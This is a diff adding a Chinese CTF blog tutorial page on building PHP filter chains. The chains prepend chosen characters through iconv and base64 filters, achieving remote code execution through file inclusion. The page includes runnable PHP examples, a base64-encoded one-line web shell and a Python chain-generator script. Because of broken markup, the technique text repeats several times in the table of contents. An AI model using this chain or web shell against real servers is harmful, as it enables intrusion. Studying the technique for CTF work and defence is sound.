@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="通过php函数的分析解析php的filter链构造  php-base64函数特性分析    &lt;1&gt;base64解码时，要求所传参数为4的倍数，如果所传参数不是4的倍数呢，我们来逐个分析 所传参数位数为4*n+1   此时并不影响解码的结果，相当于删除最后一位后解码 所传参数位数为4*n+2   此时运行相当于自动补全两个等号后解码 所传参数位数为4*n+3   此时相当于自动补全一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Filter链之php">
+<meta property="og:url" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="通过php函数的分析解析php的filter链构造  php-base64函数特性分析    &lt;1&gt;base64解码时，要求所传参数为4的倍数，如果所传参数不是4的倍数呢，我们来逐个分析 所传参数位数为4*n+1   此时并不影响解码的结果，相当于删除最后一位后解码 所传参数位数为4*n+2   此时运行相当于自动补全两个等号后解码 所传参数位数为4*n+3   此时相当于自动补全一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png">
+<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/2.png">
+<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/3.png">
+<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/4.png">
+<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/5.png">
+<meta property="article:published_time" content="2025-01-30T14:32:12.000Z">
+<meta property="article:modified_time" content="2025-01-30T15:43:34.093Z">
+<meta property="article:author" content="SunRT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Filter链之php</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/01/26/hac-my-vm-Quick2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&text=Filter链之php"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&is_video=false&description=Filter链之php"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Filter链之php&body=Check out this article: http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&name=Filter链之php&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&t=Filter链之php"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">通过php函数的分析解析php的filter链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">php-base64函数特性分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.1.</span> <span class="toc-text">所传参数位数为4*n+1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.2.</span> <span class="toc-text">所传参数位数为4*n+2
+
+
+此时运行相当于自动补全两个等号后解码
+所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.3.</span> <span class="toc-text">
+
+
+此时运行相当于自动补全两个等号后解码
+所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.4.</span> <span class="toc-text">所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.5.</span> <span class="toc-text">
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">编码过滤器的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">想要构造的字符哪里来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">用于梭哈的脚本以及脚本的分析</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Filter链之php
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-30T14:32:12.000Z" itemprop="datePublished">2025-01-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1>通过php函数的分析解析php的filter链构造</h1>
+
+<h3>php-base64函数特性分析</h3>
+
+<!--注意，函数的特性与base64过滤器特性一致-->
+
+<p><strong>&lt;1&gt;base64解码时，要求所传参数为4的倍数，如果所传参数不是4的倍数呢，我们来逐个分析</strong></p>
+<h6>所传参数位数为4*n+1</h6>
+
+<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png" alt="1"></p>
+<p><strong>此时并不影响解码的结果，相当于删除最后一位后解码</strong></p>
+<h6>所传参数位数为4*n+2<h6>
+
+<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/2.png" alt="2"></p>
+<p><strong>此时运行相当于自动补全两个等号后解码</strong></p>
+<h6>所传参数位数为4*n+3<h6>
+
+<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/3.png" alt="3"></p>
+<p><strong>此时相当于自动补全一个等号后解码</strong></p>
